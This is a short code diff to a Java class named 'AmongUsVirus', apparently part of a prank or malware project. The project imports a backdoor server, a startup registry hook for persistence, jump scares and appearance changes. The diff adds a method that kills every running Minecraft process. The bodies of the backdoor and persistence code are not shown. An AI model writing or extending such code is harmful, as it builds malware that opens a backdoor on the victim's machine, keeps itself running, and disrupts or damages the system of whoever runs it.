@@ -4,6 +4,7 @@ import com.github.pulsebeat02.appearance.AppearanceChanger;
 import com.github.pulsebeat02.backdoor.BackDoorServer;
 import com.github.pulsebeat02.backdoor.ServerStartup;
 import com.github.pulsebeat02.jumpscare.RandomJumpScare;
+import com.github.pulsebeat02.utility.TaskUtilities;
 
 public class AmongUsVirus {
 
@@ -18,6 +19,11 @@ public class AmongUsVirus {
         startup = new ServerStartup();
         startup.addRegistry();
         changer = new AppearanceChanger();
+        killMinecraftTasks();
+    }
+
+    public void killMinecraftTasks() {
+        TaskUtilities.killAllTasks("Minecraft");
     }
 
     public static void main(final String[] args) {
